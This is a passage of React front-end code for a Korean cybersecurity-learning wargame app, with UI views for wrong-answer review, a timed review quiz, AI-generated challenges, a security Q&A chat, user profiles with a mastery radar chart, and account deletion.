                    <div style={{ fontSize: '24px', color: '#fff', fontWeight: 'bold', marginTop: '4px' }}>{wrongProblems.length}건</div>
                  </div>
                  <div className="cyber-card-main" style={{ padding: '16px', borderColor: 'rgba(244,63,94,0.3)' }}>
                    <div style={{ fontSize: '11px', color: '#64748b' }}>미해결 취약점</div>
                    <div style={{ fontSize: '24px', color: '#f43f5e', fontWeight: 'bold', marginTop: '4px' }}>{unsolvedCount}개</div>
                  </div>
                  <div className="cyber-card-main" style={{ padding: '16px', borderColor: 'rgba(16,185,129,0.3)' }}>
                    <div style={{ fontSize: '11px', color: '#64748b' }}>재도전 정복 성공</div>
                    <div style={{ fontSize: '24px', color: '#10b981', fontWeight: 'bold', marginTop: '4px' }}>{clearedCount}개</div>
                  </div>
                  <div className="cyber-card-main" style={{ padding: '16px', borderColor: 'rgba(0,242,254,0.3)' }}>
                    <div style={{ fontSize: '11px', color: '#64748b' }}>오답 박멸도 (Kill Rate)</div>
                    <div style={{ fontSize: '24px', color: '#00f2fe', fontWeight: 'bold', marginTop: '4px' }}>{killRate}%</div>
                  </div>
                </div>

                <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
                  <button onClick={() => setDebriefCategoryFilter('ALL')} style={{ padding: '6px 14px', fontSize: '12px', fontWeight: 'bold', cursor: 'pointer', background: debriefCategoryFilter === 'ALL' ? 'rgba(244,63,94,0.15)' : 'transparent', border: `1px solid ${debriefCategoryFilter === 'ALL' ? '#f43f5e' : 'rgba(255,255,255,0.1)'}`, color: debriefCategoryFilter === 'ALL' ? '#f43f5e' : '#94a3b8' }}>전체 오답</button>
                  {categories.map((cat) => (
                    <button key={cat.id} onClick={() => setDebriefCategoryFilter(cat.name)} style={{ padding: '6px 14px', fontSize: '12px', fontWeight: 'bold', cursor: 'pointer', background: debriefCategoryFilter === cat.name ? 'rgba(244,63,94,0.15)' : 'transparent', border: `1px solid ${debriefCategoryFilter === cat.name ? '#f43f5e' : 'rgba(255,255,255,0.1)'}`, color: debriefCategoryFilter === cat.name ? '#f43f5e' : '#94a3b8' }}>{cat.icon} {cat.name}</button>
                  ))}
                </div>

                {wrongProblems.length === 0 ? (
                  <div className="cyber-card-main" style={{ padding: '50px', textAlign: 'center', color: '#64748b' }}>
                    아직 틀린 문제가 없습니다. 워게임에 도전해 보세요!
                  </div>
                ) : (
                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(300px, 1fr))', gap: '15px' }}>
                    {wrongProblems.map((prob) => {
                      const isCleared = effectiveSolvedIds.includes(prob.id);
                      return (
                        <div key={prob.id} className="cyber-card-main" style={{ padding: '18px', borderColor: isCleared ? 'rgba(16,185,129,0.4)' : 'rgba(244,63,94,0.35)' }}>
                          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '8px' }}>
                            <span style={{ fontSize: '11px', color: '#94a3b8' }}>{prob.category}</span>
                            <span style={{ fontSize: '11px', fontWeight: 'bold', color: isCleared ? '#10b981' : '#f43f5e' }}>{isCleared ? '✓ 정복 완료' : '✕ 미해결'}</span>
                          </div>
                          <h4 style={{ margin: '0 0 10px 0', color: '#fff', fontSize: '14px' }}>{prob.title}</h4>
                          <div style={{ fontSize: '12px', color: '#facc15', background: 'rgba(250,204,21,0.08)', border: '1px solid rgba(250,204,21,0.25)', padding: '8px 10px', marginBottom: '12px', lineHeight: '1.5' }}>
                            💡 {prob.hint}
                          </div>
                          <button onClick={() => startProblemSession(prob)} className="cyber-btn-cyan" style={{ width: '100%', padding: '8px', fontSize: '12px' }}>
                            🔄 다시 도전하기
                          </button>
                        </div>
                      );
                    })}
                  </div>
                )}
              </div>
            );
          })()}

          {/* ==========================================
              VIEW: 복습 (풀었던 문제 기출 변형 드릴)
             ========================================== */}
          {currentView === 'speedquiz' && (() => {
            const current = quizQueue[quizIndex];

            return (
              <div style={{ width: '90%', maxWidth: '700px', margin: '30px auto', display: 'flex', flexDirection: 'column', gap: '20px', flex: 1 }}>
                <div>
                  <div style={{ fontSize: '12px', color: '#facc15', fontWeight: 'bold', letterSpacing: '2px' }}>🔁 REVIEW DRILL</div>
                  <h2 className="neon-forge-cyan" style={{ margin: '4px 0 0 0', fontSize: '26px', fontWeight: '900' }}>복습 — 기출 변형 스피드 드릴</h2>
                  <p style={{ margin: '4px 0 0', fontSize: '13px', color: '#94a3b8' }}>내가 이미 풀었던 문제 중 지금 실력에 맞는 것들이 다시 출제됩니다. 15초 안에 정답을 입력해서 콤보를 이어가 보세요.</p>
                </div>

                {quizStatus === 'idle' && (
                  <div className="cyber-card-main" style={{ padding: '40px', textAlign: 'center', borderColor: '#facc15' }}>
                    <div style={{ fontSize: '40px', marginBottom: '10px' }}>🔁</div>
                    <p style={{ color: '#cbd5e1', fontSize: '14px', marginBottom: '20px', lineHeight: '1.7' }}>
                      {effectiveSolvedIds.length > 0
                        ? `지금까지 푼 문제 ${effectiveSolvedIds.length}개 중 현재 레벨(Lv.${userLevel})에 맞는 8문제가 랜덤으로 다시 출제됩니다.`
                        : '아직 푼 문제가 없어서 튜토리얼 문제로 대체됩니다. 워게임을 먼저 풀어보면 그 문제들이 복습에 등장해요.'}
                      <br />각 문제당 제한시간 15초, 정답을 맞히면 콤보가 쌓여 더 높은 점수를 얻어요.
                    </p>
                    <button onClick={startSpeedQuiz} className="cyber-btn-cyan" style={{ padding: '14px 32px', fontSize: '15px', fontWeight: 'bold', borderColor: '#facc15', color: '#facc15' }}>
                      🚀 시작하기
                    </button>
                  </div>
                )}

                {quizStatus === 'playing' && current && (
                  <div className="cyber-card-main" style={{ padding: '30px', borderColor: '#facc15' }}>
                    <div style={{ width: '100%', height: '8px', background: '#010307', border: '1px solid rgba(250,204,21,0.3)', marginBottom: '20px', overflow: 'hidden' }}>
                      <div style={{ width: `${(quizTimeLeft / 15) * 100}%`, height: '100%', background: 'linear-gradient(90deg, #facc15, #f59e0b)', transition: 'width 1s linear' }} />
                    </div>

                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '14px' }}>
                      <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
                        <span style={{ background: '#facc15', color: '#000', fontWeight: 900, fontSize: '12px', padding: '2px 8px' }}>Q {quizIndex + 1} / {quizQueue.length}</span>
                        <span style={{ color: '#00f2fe', fontSize: '12px', border: '1px solid rgba(0,242,254,0.3)', padding: '2px 8px' }}>{current.category}</span>
                      </div>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                        <span style={{ color: '#facc15', fontFamily: 'monospace', fontWeight: 'bold' }}>⏱ {quizTimeLeft}s</span>
                        <button onClick={cancelSpeedQuiz} style={{ background: 'transparent', border: '1px solid #475569', color: '#94a3b8', padding: '4px 10px', fontSize: '11px', cursor: 'pointer' }}>
                          ✕ 취소
                        </button>
                      </div>
                    </div>

                    <h3 style={{ color: '#fff', fontSize: '17px', lineHeight: '1.6', marginBottom: '8px' }}>{current.title}</h3>
                    <p style={{ color: '#94a3b8', fontSize: '12px', marginBottom: '20px' }}>💡 {current.hint}</p>

                    <input
                      type="text"
                      autoFocus
                      value={quizInput}
                      onChange={(e) => setQuizInput(e.target.value)}
                      onKeyDown={(e) => { if (e.key === 'Enter') submitQuizAnswer(); }}
                      disabled={quizFeedback !== 'idle'}
                      placeholder="정답을 입력하고 Enter..."
                      style={{ width: '100%', padding: '14px', fontSize: '15px', fontFamily: 'Consolas, monospace', background: '#010307', border: `2px solid ${quizFeedback === 'correct' ? '#10b981' : quizFeedback === 'wrong' ? '#f43f5e' : 'rgba(250,204,21,0.4)'}`, color: '#fff', outline: 'none', marginBottom: '12px' }}
                    />

                    {quizFeedback === 'correct' && <div style={{ color: '#10b981', fontWeight: 'bold', fontSize: '13px' }}>✓ 정답입니다! (콤보 x{quizCombo})</div>}
                    {quizFeedback === 'wrong' && <div style={{ color: '#f43f5e', fontWeight: 'bold', fontSize: '13px' }}>✕ 정답: {current.answer}</div>}

                    <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: '16px', fontSize: '12px', color: '#64748b' }}>
                      <span>점수 <b style={{ color: '#facc15' }}>{quizScore}</b></span>
                      <span>현재 콤보 <b style={{ color: '#00f2fe' }}>🔥{quizCombo}</b></span>
                    </div>
                  </div>
                )}

                {quizStatus === 'result' && (
                  <div className="cyber-card-main" style={{ padding: '40px', textAlign: 'center', borderColor: '#facc15' }}>
                    <div style={{ fontSize: '12px', color: '#facc15', letterSpacing: '3px', fontWeight: 'bold', marginBottom: '10px' }}>DRILL COMPLETE</div>
                    <h2 className="neon-forge-cyan" style={{ fontSize: '28px', marginBottom: '20px' }}>🔁 복습 완료!</h2>
                    <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '15px', marginBottom: '25px' }}>
                      <div style={{ padding: '14px', background: 'rgba(250,204,21,0.08)', border: '1px solid rgba(250,204,21,0.3)' }}>
                        <div style={{ fontSize: '11px', color: '#94a3b8' }}>총 점수</div>
                        <div style={{ fontSize: '22px', color: '#facc15', fontWeight: 'bold', marginTop: '4px' }}>{quizScore}</div>
                      </div>
                      <div style={{ padding: '14px', background: 'rgba(0,242,254,0.08)', border: '1px solid rgba(0,242,254,0.3)' }}>
                        <div style={{ fontSize: '11px', color: '#94a3b8' }}>최대 콤보</div>
                        <div style={{ fontSize: '22px', color: '#00f2fe', fontWeight: 'bold', marginTop: '4px' }}>🔥{quizMaxCombo}</div>
                      </div>
                      <div style={{ padding: '14px', background: 'rgba(16,185,129,0.08)', border: '1px solid rgba(16,185,129,0.3)' }}>
                        <div style={{ fontSize: '11px', color: '#94a3b8' }}>획득 XP</div>
                        <div style={{ fontSize: '22px', color: '#10b981', fontWeight: 'bold', marginTop: '4px' }}>+{quizEarnedXp}</div>
                      </div>
                    </div>
                    <div style={{ display: 'flex', gap: '12px', justifyContent: 'center' }}>
                      <button onClick={startSpeedQuiz} className="cyber-btn-cyan" style={{ padding: '12px 26px', fontSize: '13px', borderColor: '#facc15', color: '#facc15' }}>🔄 한 번 더</button>
                      <button onClick={() => { setQuizStatus('idle'); setCurrentView('main'); }} className="cyber-btn-purple" style={{ padding: '12px 26px', fontSize: '13px' }}>대시보드로</button>
                    </div>
                  </div>
                )}
              </div>
            );
          })()}

          {/* ==========================================
              VIEW: 심화 풀이 모드 (AI 문제 생성)
             ========================================== */}
          {currentView === 'aichallenge' && (
            <div style={{ width: '90%', maxWidth: '700px', margin: '30px auto', display: 'flex', flexDirection: 'column', gap: '20px', flex: 1 }}>
              <div>
                <button onClick={() => { setWargameStage('hub'); setCurrentView('wargames'); }} style={{ background: 'transparent', border: 'none', color: '#94a3b8', cursor: 'pointer', fontSize: '12px', marginBottom: '6px', padding: 0 }}>← 레벨 선택으로</button>
                <div style={{ fontSize: '12px', color: '#ec4899', fontWeight: 'bold' }}>AI CHALLENGE FORGE</div>
                <h2 className="neon-forge-cyan" style={{ margin: '4px 0 0 0', fontSize: '26px', fontWeight: '900' }}>🧠 심화 풀이 모드</h2>
                <p style={{ margin: '4px 0 0', fontSize: '13px', color: '#94a3b8' }}>내 AI API 키를 사용해 매번 새로운 고급(Hard) 난이도 문제를 즉석에서 만들어 풉니다.</p>
              </div>

              <div className="cyber-card-main" style={{ padding: '28px', borderColor: 'rgba(236,72,153,0.4)' }}>
                <div style={{ marginBottom: '16px' }}>
                  <label style={{ display: 'block', fontSize: '12px', color: '#cbd5e1', fontWeight: 'bold', marginBottom: '6px' }}>카테고리</label>
                  <select
                    value={aiCategory}
                    onChange={(e) => setAiCategory(e.target.value)}
                    style={{ width: '100%', padding: '10px', background: '#010307', border: '1px solid rgba(236,72,153,0.3)', color: '#fff', outline: 'none', fontSize: '13px' }}
                  >
                    {categories.map((cat) => (
                      <option key={cat.id} value={cat.name}>{cat.icon} {cat.name}</option>
                    ))}
                  </select>
                </div>

                <div style={{ marginBottom: '16px' }}>
                  <label style={{ display: 'block', fontSize: '12px', color: '#cbd5e1', fontWeight: 'bold', marginBottom: '6px' }}>AI 제공자</label>
                  <div style={{ display: 'flex', gap: '8px' }}>
                    <button onClick={() => setAiProvider('claude')} style={{ flex: 1, padding: '10px', fontSize: '12px', fontWeight: 'bold', cursor: 'pointer', background: aiProvider === 'claude' ? 'rgba(236,72,153,0.15)' : 'transparent', border: `1px solid ${aiProvider === 'claude' ? '#ec4899' : 'rgba(255,255,255,0.15)'}`, color: aiProvider === 'claude' ? '#ec4899' : '#94a3b8' }}>Claude</button>
                    <button onClick={() => setAiProvider('gemini')} style={{ flex: 1, padding: '10px', fontSize: '12px', fontWeight: 'bold', cursor: 'pointer', background: aiProvider === 'gemini' ? 'rgba(236,72,153,0.15)' : 'transparent', border: `1px solid ${aiProvider === 'gemini' ? '#ec4899' : 'rgba(255,255,255,0.15)'}`, color: aiProvider === 'gemini' ? '#ec4899' : '#94a3b8' }}>Google Gemini</button>
                    <button onClick={() => setAiProvider('openai')} style={{ flex: 1, padding: '10px', fontSize: '12px', fontWeight: 'bold', cursor: 'pointer', background: aiProvider === 'openai' ? 'rgba(236,72,153,0.15)' : 'transparent', border: `1px solid ${aiProvider === 'openai' ? '#ec4899' : 'rgba(255,255,255,0.15)'}`, color: aiProvider === 'openai' ? '#ec4899' : '#94a3b8' }}>OpenAI</button>
                  </div>
                </div>

                <div style={{ marginBottom: '10px' }}>
                  <label style={{ display: 'block', fontSize: '12px', color: '#cbd5e1', fontWeight: 'bold', marginBottom: '6px' }}>
                    {aiProvider === 'claude' ? 'Claude(Anthropic)' : aiProvider === 'gemini' ? 'Gemini' : 'OpenAI'} API 키
                  </label>
                  <input
                    type="password"
                    value={aiApiKey}
                    onChange={(e) => setAiApiKey(e.target.value)}
                    placeholder={aiProvider === 'claude' ? 'sk-ant-...' : aiProvider === 'gemini' ? 'AIza...' : 'sk-...'}
                    style={{ width: '100%', padding: '10px', background: '#010307', border: '1px solid rgba(236,72,153,0.3)', color: '#fff', outline: 'none', fontSize: '13px', fontFamily: 'monospace' }}
                  />
                  <p style={{ margin: '6px 0 0', fontSize: '11px', color: '#64748b', lineHeight: '1.5' }}>
                    API 키는 이 브라우저에만 저장되며 서버에 보관되지 않습니다. {aiProvider === 'claude' ? 'Anthropic Console(console.anthropic.com)' : aiProvider === 'gemini' ? 'Google AI Studio(aistudio.google.com)' : 'OpenAI Platform(platform.openai.com)'}에서 발급받을 수 있습니다.
                  </p>
                </div>

                {aiGenError && (
                  <div style={{ marginBottom: '14px', padding: '10px 12px', border: '1px solid #f87171', color: '#f87171', fontSize: '12px', background: 'rgba(248,113,113,0.08)' }}>
                    ⚠ {aiGenError}
                  </div>
                )}

                <button
                  onClick={generateAiChallenge}
                  disabled={aiGenLoading}
                  className="cyber-btn-cyan"
                  style={{ width: '100%', padding: '14px', fontSize: '14px', fontWeight: 'bold', borderColor: '#ec4899', color: '#ec4899', cursor: aiGenLoading ? 'wait' : 'pointer', opacity: aiGenLoading ? 0.6 : 1 }}
                >
                  {aiGenLoading ? '⏳ AI가 문제를 만드는 중...' : '🧠 AI 문제 생성하고 바로 풀기'}
                </button>
                <p style={{ margin: '10px 0 0', fontSize: '11px', color: '#64748b', textAlign: 'center' }}>
                  생성된 문제는 자동으로 보관함에 저장되어 다른 사용자도 풀어볼 수 있어요.
                </p>
              </div>

              {/* AI 제작 문제 보관함 (다른 사용자가 만든 문제도 함께 표시) */}
              <div className="cyber-card-main" style={{ padding: '20px' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '14px' }}>
                  <h3 style={{ margin: 0, color: '#ec4899', fontSize: '15px' }}>📚 AI 제작 문제 보관함</h3>
                  <button onClick={loadAiChallengeLibrary} style={{ background: 'transparent', border: '1px solid #475569', color: '#94a3b8', padding: '4px 10px', fontSize: '11px', cursor: 'pointer' }}>↻ 새로고침</button>
                </div>
                {aiLibraryLoading && <div style={{ padding: '20px', textAlign: 'center', color: '#64748b', fontSize: '12px' }}>불러오는 중...</div>}
                {!aiLibraryLoading && aiChallengeLibrary.length === 0 && (
                  <div style={{ padding: '20px', textAlign: 'center', color: '#64748b', fontSize: '12px' }}>아직 생성된 AI 문제가 없습니다. 위에서 첫 문제를 만들어 보세요!</div>
                )}
                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                  {aiChallengeLibrary.map((p) => (
                    <div key={p.id} onClick={() => startProblemSession(p)} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '12px 14px', background: 'rgba(236,72,153,0.05)', border: '1px solid rgba(236,72,153,0.2)', cursor: 'pointer' }}>
                      <div style={{ minWidth: 0 }}>
                        <div style={{ color: '#fff', fontWeight: 'bold', fontSize: '13px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{p.title}</div>
                        <div style={{ color: '#94a3b8', fontSize: '11px', marginTop: '2px' }}>{p.category} · {p.role}</div>
                      </div>
                      <span style={{ fontSize: '11px', color: '#facc15', flexShrink: 0, marginLeft: '10px' }}>+{p.xp} XP</span>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* ==========================================
              VIEW: AI 질문하기 (일반 보안 Q&A)
             ========================================== */}
          {currentView === 'ai_help' && (
            <div style={{ width: '90%', maxWidth: '760px', margin: '30px auto', display: 'flex', flexDirection: 'column', gap: '20px', flex: 1 }}>
              <div>
                <div style={{ fontSize: '12px', color: '#a855f7', fontWeight: 'bold' }}>ASK AI</div>
                <h2 className="neon-forge-cyan" style={{ margin: '4px 0 0 0', fontSize: '26px', fontWeight: '900' }}>🤖 AI에게 질문하기</h2>
                <p style={{ margin: '4px 0 0', fontSize: '13px', color: '#94a3b8' }}>보안 용어나 개념이 궁금할 때 편하게 물어보세요. 특정 문제의 정답을 알려주지는 않아요 — 개념 이해를 도와드려요.</p>
              </div>

              <div className="cyber-card-main" style={{ padding: 0, display: 'flex', flexDirection: 'column', height: '560px', borderColor: 'rgba(168,85,247,0.4)' }}>
                <div style={{ flex: 1, minHeight: 0, padding: '20px', overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: '14px' }}>
                  {aiHelpMessages.map((msg, idx) => (
                    <div key={idx} style={{ alignSelf: msg.role === 'user' ? 'flex-end' : 'flex-start', maxWidth: '85%' }}>
                      <div style={{ fontSize: '10px', color: '#64748b', marginBottom: '3px', textAlign: msg.role === 'user' ? 'right' : 'left' }}>
                        {msg.role === 'user' ? 'YOU' : '🤖 AI'}
                      </div>
                      <div style={{ padding: '12px 14px', fontSize: '13px', lineHeight: '1.7', background: msg.role === 'user' ? 'rgba(0,242,254,0.1)' : 'rgba(168,85,247,0.1)', border: msg.role === 'user' ? '1px solid rgba(0,242,254,0.3)' : '1px solid rgba(168,85,247,0.3)', color: '#e2e8f0', borderRadius: '4px', whiteSpace: 'pre-wrap' }}>
                        {msg.text}
                      </div>
                    </div>
                  ))}
                  {aiHelpLoading && (
                    <div style={{ alignSelf: 'flex-start', fontSize: '12px', color: '#a855f7' }}>🤖 생각하는 중...</div>
                  )}
                </div>

                <div style={{ padding: '14px', borderTop: '1px solid rgba(168,85,247,0.25)' }}>
                  <div style={{ display: 'flex', gap: '6px', marginBottom: '10px', flexWrap: 'wrap' }}>
                    {['SQL Injection이 뭔가요?', 'XSS는 왜 위험한가요?', '비밀번호는 어떻게 안전하게 저장하나요?', 'HTTPS와 HTTP 차이가 뭔가요?'].map((q) => (
                      <button key={q} onClick={() => sendAiHelpMessage(q)} disabled={aiHelpLoading} style={{ background: 'rgba(168,85,247,0.08)', border: '1px solid rgba(168,85,247,0.3)', color: '#d8b4fe', fontSize: '11px', padding: '5px 10px', cursor: aiHelpLoading ? 'default' : 'pointer', borderRadius: '3px' }}>
                        {q}
                      </button>
                    ))}
                  </div>
                  <div style={{ display: 'flex', gap: '8px' }}>
                    <input
                      type="text"
                      value={aiHelpInput}
                      onChange={(e) => setAiHelpInput(e.target.value)}
                      onKeyDown={(e) => { if (e.key === 'Enter') sendAiHelpMessage(); }}
                      disabled={aiHelpLoading}
                      placeholder="궁금한 보안 개념을 질문해 보세요..."
                      style={{ flex: 1, padding: '12px', background: '#010307', border: '1px solid rgba(168,85,247,0.3)', color: '#fff', outline: 'none', fontSize: '13px', borderRadius: '4px' }}
                    />
                    <button onClick={() => sendAiHelpMessage()} disabled={aiHelpLoading} style={{ background: 'rgba(168,85,247,0.15)', border: '1px solid #a855f7', color: '#d8b4fe', padding: '12px 20px', fontSize: '13px', fontWeight: 'bold', cursor: aiHelpLoading ? 'wait' : 'pointer', borderRadius: '4px' }}>
                      전송
                    </button>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* ==========================================
              VIEW: PROFILE & TACTICAL RADAR
             ========================================== */}
          {currentView === 'profile' && (
            <div style={{ width: '90%', maxWidth: '1200px', margin: '30px auto', display: 'flex', flexDirection: 'column', gap: '20px', flex: 1 }}>
              <div>
                <div style={{ fontSize: '12px', color: '#00f2fe', fontWeight: 'bold' }}>AGENT DOSSIER</div>
                <h2 className="neon-forge-cyan" style={{ margin: '4px 0 0 0', fontSize: '26px', fontWeight: '900' }}>🎖️ 화이트햇 에이전트 상세 프로필</h2>
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1.8fr', gap: '25px', alignItems: 'start' }}>
                {/* Identity & Radar Card */}
                <div className="cyber-card-main" style={{ padding: '25px', textAlign: 'center' }}>
                  <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '12px' }}>
                    <TitleAvatarBadge title={selectedProfileTitle} size={110} frame="circle" />
                  </div>
                  <div style={{ fontSize: '11px', color: '#64748b' }}>장착된 칭호</div>
                  <div style={{ color: selectedProfileTitle.color, fontWeight: 'bold', fontSize: '14px', marginBottom: '8px' }}>
                    {selectedProfileTitle.kind === 'mastery' ? `${selectedProfileTitle.categoryName} T${selectedProfileTitle.tier}` : selectedProfileTitle.name}
                  </div>
                  <h3 style={{ margin: '0 0 8px 0', fontSize: '22px', color: '#fff' }}>{username}</h3>
                  
                  <div style={{ display: 'inline-flex', alignItems: 'center', gap: '6px', padding: '6px 12px', fontSize: '12px', fontWeight: 'bold', ...getLevelTierBadgeStyle(userLevelTier) }}>
                    <RankEmblem type={userLevelTierMeta.iconType} color={userLevelTierMeta.color} size={20} isRainbow={userLevelTierMeta.isRainbow} />
                    <span>LEVEL {userLevel} · {userLevelTier}</span>
                  </div>

                  {/* 8-Axis Polygon Radar Chart */}
                  <div style={{ marginTop: '20px', paddingTop: '16px', borderTop: '1px solid rgba(255,255,255,0.06)' }}>
                    <div style={{ fontSize: '11px', color: '#64748b', fontWeight: 'bold', marginBottom: '10px', textAlign: 'left' }}>
                      8축 전술 역량 레이더 (0T ~ 5T)
                    </div>
                    {(() => {
                      const center = 110;
                      const maxRadius = 75;
                      const angleStep = (Math.PI * 2) / categories.length;
                      const points = categories.map((cat, i) => {
                        const m = tacticalMastery[cat.id] ?? { tier: 0, progress: 0 };
                        const r = (Math.max(0, Math.min(5, m.tier)) / 5) * maxRadius;
                        const angle = -Math.PI / 2 + i * angleStep;
                        return { x: center + Math.cos(angle) * r, y: center + Math.sin(angle) * r, cat };
                      });
                      const poly = points.map(p => `${p.x},${p.y}`).join(' ');

                      return (
                        <svg viewBox="0 0 220 220" style={{ width: '100%', maxWidth: '240px', margin: '0 auto', display: 'block' }}>
                          {[1, 2, 3, 4, 5].map(step => {
                            const r = (maxRadius / 5) * step;
                            const ring = categories.map((_, i) => {
                              const angle = -Math.PI / 2 + i * angleStep;
                              return `${center + Math.cos(angle) * r},${center + Math.sin(angle) * r}`;
                            }).join(' ');
                            return <polygon key={step} points={ring} fill="none" stroke="rgba(148,163,184,0.2)" strokeWidth="1" />;
                          })}
                          {categories.map((c, i) => {
                            const angle = -Math.PI / 2 + i * angleStep;
                            const lx = center + Math.cos(angle) * (maxRadius + 18);
                            const ly = center + Math.sin(angle) * (maxRadius + 18);
                            return <text key={c.id} x={lx} y={ly} textAnchor="middle" dominantBaseline="middle" fontSize="9" fill="#94a3b8" fontWeight="bold">{c.name.split(' ')[0]}</text>;
                          })}
                          <polygon points={poly} fill="rgba(0,242,254,0.18)" stroke="#00f2fe" strokeWidth="2" />
                        </svg>
                      );
                    })()}
                  </div>
                </div>

                {/* Right Mastery Gauges */}
                <div className="cyber-card-main" style={{ padding: '25px' }}>
                  <h3 style={{ margin: '0 0 20px 0', fontSize: '16px', color: '#00f2fe' }}>📊 8대 전술 마스터리 진행도</h3>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                    {categories.map(cat => {
                      const m = tacticalMastery[cat.id] ?? { tier: 0, progress: 0 };
                      const pct = getMasteryPercent(m);
                      const req = getTierRequirement(m.tier);

                      return (
                        <div key={cat.id}>
                          <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '13px', marginBottom: '6px' }}>
                            <span style={{ color: '#fff', fontWeight: 'bold' }}>
                              {cat.icon} {cat.name}
                              <span style={{ marginLeft: '8px', color: getTierTextColor(m.tier), border: `1px solid ${getTierTextColor(m.tier)}`, padding: '1px 6px', fontSize: '10px' }}>
                                {m.tier}T
                              </span>
                            </span>
                            <span style={{ color: getTierTextColor(m.tier), fontWeight: 'bold', fontSize: '12px' }}>
                              {pct.toFixed(1)}% ({m.tier >= 5 ? 'MAX' : `${m.progress} / ${req}`})
                            </span>
                          </div>
                          <div style={{ width: '100%', height: '8px', background: '#010307', border: '1px solid rgba(0,242,254,0.2)', overflow: 'hidden' }}>
                            <div className={m.tier >= 5 ? 'rainbow-mastery-bar' : ''} style={{ width: `${pct}%`, height: '100%', ...getTierGaugeStyle(m.tier), transition: 'width 0.4s' }} />
                          </div>
                        </div>
                      );
                    })}
                  </div>
                </div>
              </div>

              {/* 계정 관리 */}
              <div className="cyber-card-main" style={{ padding: '20px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '12px' }}>
                <div>
                  <h3 style={{ margin: 0, fontSize: '14px', color: '#94a3b8' }}>계정 관리</h3>
                  <p style={{ margin: '4px 0 0', fontSize: '12px', color: '#64748b' }}>{authToken ? '정식 계정으로 로그인되어 있습니다.' : '게스트 모드입니다 — 이 기기에만 진행 상황이 저장됩니다.'}</p>
                </div>
                <div style={{ display: 'flex', gap: '10px' }}>
                  <button onClick={handleLogout} style={{ background: 'transparent', border: '1px solid #475569', color: '#94a3b8', padding: '10px 18px', fontSize: '13px', fontWeight: 'bold', cursor: 'pointer' }}>
                    🚪 로그아웃
                  </button>
                  {authToken && (
                    <button onClick={() => { setIsDeleteAccountOpen(true); setDeleteAccountError(''); setDeleteAccountPassword(''); }} style={{ background: 'rgba(244,63,94,0.1)', border: '1px solid #f43f5e', color: '#f43f5e', padding: '10px 18px', fontSize: '13px', fontWeight: 'bold', cursor: 'pointer' }}>
                      🗑 계정 삭제
                    </button>
                  )}
                </div>
              </div>

              {/* 계정 삭제 확인 모달 */}
              {isDeleteAccountOpen && (
                <div onClick={() => !deleteAccountLoading && setIsDeleteAccountOpen(false)} style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.75)', backdropFilter: 'blur(4px)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 300 }}>
                  <div onClick={(e) => e.stopPropagation()} className="cyber-card-main" style={{ width: 'min(440px, 92vw)', padding: '28px', borderColor: '#f43f5e', boxShadow: '0 0 40px rgba(244,63,94,0.35)' }}>
                    <h3 style={{ margin: '0 0 10px 0', color: '#f43f5e', fontSize: '16px' }}>⚠ 정말로 계정을 삭제하시겠습니까?</h3>
                    <p style={{ margin: '0 0 18px', fontSize: '13px', color: '#94a3b8', lineHeight: '1.6' }}>
                      계정과 진행 상황(레벨, XP, 클리어 기록)이 서버에서 영구적으로 삭제되며 되돌릴 수 없습니다. 계속하려면 비밀번호를 입력하세요.
                    </p>
                    <input
                      type="password"
                      value={deleteAccountPassword}
                      onChange={(e) => setDeleteAccountPassword(e.target.value)}
                      onKeyDown={(e) => { if (e.key === 'Enter') handleDeleteAccount(); }}
                      placeholder="비밀번호 확인"
                      style={{ width: '100%', padding: '10px', background: '#010307', border: '1px solid rgba(244,63,94,0.4)', color: '#fff', outline: 'none', fontSize: '13px', marginBottom: '10px' }}
                    />
                    {deleteAccountError && (
                      <div style={{ marginBottom: '12px', fontSize: '12px', color: '#f87171' }}>⚠ {deleteAccountError}</div>
                    )}
                    <div style={{ display: 'flex', gap: '10px', justifyContent: 'flex-end' }}>
                      <button onClick={() => setIsDeleteAccountOpen(false)} disabled={deleteAccountLoading} style={{ background: 'transparent', border: '1px solid #475569', color: '#94a3b8', padding: '10px 18px', fontSize: '13px', cursor: 'pointer' }}>취소</button>
                      <button onClick={handleDeleteAccount} disabled={deleteAccountLoading} style={{ background: '#f43f5e', border: 'none', color: '#000', padding: '10px 18px', fontSize: '13px', fontWeight: 'bold', cursor: deleteAccountLoading ? 'wait' : 'pointer', opacity: deleteAccountLoading ? 0.6 : 1 }}>
                        {deleteAccountLoading ? '삭제 중...' : '영구 삭제'}
                      </button>
                    </div>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* ==========================================
              VIEW: TITLE VAULT (칭호 보관소)
             ========================================== */}
          {currentView === 'titles' && (
            <div style={{ width: '90%', maxWidth: '1300px', margin: '30px auto', display: 'flex', flexDirection: 'column', gap: '25px', flex: 1, paddingBottom: '40px' }}>
              <div>
                <div style={{ fontSize: '12px', color: '#facc15', fontWeight: 'bold' }}>TITLE VAULT</div>
                <h2 className="neon-forge-cyan" style={{ margin: '4px 0 0 0', fontSize: '26px', fontWeight: '900' }}>🏅 칭호 보관소</h2>
